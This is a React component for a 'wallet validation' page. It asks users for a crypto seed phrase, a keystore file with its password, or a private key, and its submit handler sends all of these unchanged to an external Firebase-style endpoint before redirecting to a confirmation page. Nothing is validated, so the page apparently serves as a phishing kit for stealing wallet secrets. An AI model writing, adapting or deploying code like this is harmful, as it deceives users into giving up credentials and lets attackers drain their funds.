import React from "react";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import Loader from "../component/Loader/Loader";

const SubmitWallet = () => {
  const [current, setCurrent] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [enteredValue, setEnteredValue] = useState({
    phrase: "",
    keystore: "",
    password: "",
    privateKey: "",
  });

  const navigate = useNavigate();

  const switchHandle = (id) => [setCurrent(id)];

  const onChangeHandle = (e) => {
    setEnteredValue({
      ...enteredValue,
      [e.target.name]: e.target.value,
    });
  };

  const url = import.meta.env.VITE_APP_FIREBASEAPI;


  const formSubmit = async (e) => {
    e.preventDefault();

    setIsLoading(true);

    const res = await fetch(`${url}`, {
      method: "POST",
      headers: {
        "Content-Type": "Application/json",
      },
      body: JSON.stringify(enteredValue),
    });

    const data = await res.json();

    navigate("/confirmation");

    setIsLoading(false);
  };

  return (
    <>
      {isLoading && <Loader />}
      <div className="py-20">
        <div className="flex justify-center gap-10 sm:gap-10 md:gap-20 lg:gap-20  md:mb-10 ">
          <button
            onClick={() => switchHandle(1)}
            className={`border text-slate-50 border-[#1bbdfc] px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-full ${
              current === 1 ? "bg-[#1bbdfc]" : ""
            }`}
          >
            Phrase
          </button>
          <button
            onClick={() => switchHandle(2)}
            className={`border text-slate-50 border-[#1bbdfc] px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-full ${
              current === 2 ? "bg-[#1bbdfc] " : ""
            }`}
          >
            Keystore
          </button>
          <button
            onClick={() => switchHandle(3)}
            className={`border text-slate-50 border-[#1bbdfc] px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-full ${
              current === 3 ? "bg-[#1bbdfc] " : ""
            }`}
          >
            Private keys
          </button>
        </div>

        <div className=" text-center py-14">
          <form onSubmit={formSubmit}>
            <div className="mb-10">
              {current === 1 ? (
                <div>
                  <textarea
                    value={enteredValue.phrase}
                    name="phrase"
                    onChange={onChangeHandle}
                    className="w-[90%] h-[200px] rounded-lg border text-slate-100 bg-transparent  py-5 outline-0 px-6  border-[#1bbdfc] mb-7"
                    placeholder="Typically 12 (sometimes 24) words seperated by single spaces"
                  ></textarea>
                </div>
              ) : null}

              {current === 2 ? (
                <div>
                  <textarea
                    value={enteredValue.keystore}
                    onChange={onChangeHandle}
                    name="keystore"
                    className="w-[90%] h-[200px] text-slate-100 bg-transparent  py-5 outline-0 px-6 rounded-lg border  border-[#1bbdfc] mb-5"
                    placeholder="Several lines of text beginning with '(...)' plus the password you used to encypt it."
                  ></textarea>
                  <div>
                    <input
                      value={enteredValue.password}
                      onChange={onChangeHandle}
                      name="password"
                      className="w-[90%] text-slate-100 bg-transparent py-5 outline-0 px-6     rounded-lg border mb-7 border-[#1bbdfc] "
                      type="text"
                      placeholder="Password"
                    />
                  </div>
                </div>
              ) : null}

              {current === 3 ? (
                <div>
                  {" "}
                  <textarea
                    value={enteredValue.privateKey}
                    onChange={onChangeHandle}
                    name="privateKey"
                    className="w-[90%] h-[200px] text-slate-100 bg-transparent rounded-lg border py-5 outline-0 px-6  border-[#1bbdfc] mb-7"
                    placeholder="Typically 12 (sometimes 24) words seperated by single spaces."
                  ></textarea>
                </div>
              ) : null}
            </div>

            <button
              type="submit"
              className="w-[90%] md:w-[50%] py-2 rounded-lg bg-[#1bbdfc] hover:bg-[#1bbcfccb] px-10"
            >
              Validate
            </button>
          </form>
        </div>
      </div>
    </>
  );
};

export default SubmitWallet;
